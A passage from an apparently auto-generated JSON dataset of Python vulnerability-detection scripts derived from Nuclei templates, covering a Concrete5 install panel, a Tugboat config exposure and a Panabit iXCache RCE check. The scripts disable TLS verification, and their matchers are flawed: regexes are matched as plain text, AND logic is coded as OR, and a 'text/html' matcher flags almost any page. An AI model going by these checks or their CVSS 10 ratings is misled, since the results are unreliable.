        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: concrete5-install\nName: Concrete5 Install Panel\nSeverity: critical\nDescription: A Concrete5 installation panel was discovered.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_concrete5_install:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"concrete5-install\"\n    SEVERITY = \"critical\"\n    NAME = \"Concrete5 Install Panel\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<title>Install concrete5</title>' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<title>Install concrete5</title>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Concrete5 Install Panel\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_concrete5_install(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: concrete5-install\nName: Concrete5 Install Panel\nSeverity: critical\nDescription: A Concrete5 installation panel was discovered.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_concrete5_install:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"concrete5-install\"\n    SEVERITY = \"critical\"\n    NAME = \"Concrete5 Install Panel\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<title>Install concrete5</title>' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<title>Install concrete5</title>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Concrete5 Install Panel\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_concrete5_install(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "panel",
          "install",
          "concrete",
          "cms",
          "concrete5",
          "discovery"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_tugboat_config_exposure",
        "name": "Tugboat Configuration File Exposure",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "A Tugboat configuration file was discovered. Tugboat is a command line tool for interacting with DigitalOcean droplets.",
        "severity": "critical",
        "detection": "[AND] status HTTP [200] | mot(s) 'authentication, access_token, ssh_user'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tugboat-config-exposure\nName: Tugboat Configuration File Exposure\nSeverity: critical\nDescription: A Tugboat configuration file was discovered. Tugboat is a command line tool for interacting with DigitalOcean droplets.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tugboat_config_exposure:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tugboat-config-exposure\"\n    SEVERITY = \"critical\"\n    NAME = \"Tugboat Configuration File Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] status HTTP [200] | mot(s) 'authentication, access_token, ssh_user'\"\n\n        # Simple word matcher simulation\n        matchers = ['authentication, access_token, ssh_user']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tugboat Configuration File Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tugboat_config_exposure(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tugboat-config-exposure\nName: Tugboat Configuration File Exposure\nSeverity: critical\nDescription: A Tugboat configuration file was discovered. Tugboat is a command line tool for interacting with DigitalOcean droplets.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tugboat_config_exposure:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tugboat-config-exposure\"\n    SEVERITY = \"critical\"\n    NAME = \"Tugboat Configuration File Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] status HTTP [200] | mot(s) 'authentication, access_token, ssh_user'\"\n\n        # Simple word matcher simulation\n        matchers = ['authentication, access_token, ssh_user']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tugboat Configuration File Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tugboat_config_exposure(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "tugboat",
          "config",
          "exposure",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_panabit_ixcache_rce",
        "name": "Panabit iXCache date_config - Remote Code Execution",
        "language": "Python",
        "famille": "IoT",
        "description": "Panabit iXCache date_config module has command splicing, resulting in the execution of arbitrary commands.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)'] | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: panabit-ixcache-rce\nName: Panabit iXCache date_config - Remote Code Execution\nSeverity: critical\nDescription: Panabit iXCache date_config module has command splicing, resulting in the execution of arbitrary commands.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_panabit_ixcache_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"panabit-ixcache-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Panabit iXCache date_config - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)'] | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Panabit iXCache date_config - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_panabit_ixcache_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: panabit-ixcache-rce\nName: Panabit iXCache date_config - Remote Code Execution\nSeverity: critical\nDescription: Panabit iXCache date_config module has command splicing, resulting in the execution of arbitrary commands.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_panabit_ixcache_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"panabit-ixcache-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Panabit iXCache date_config - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", 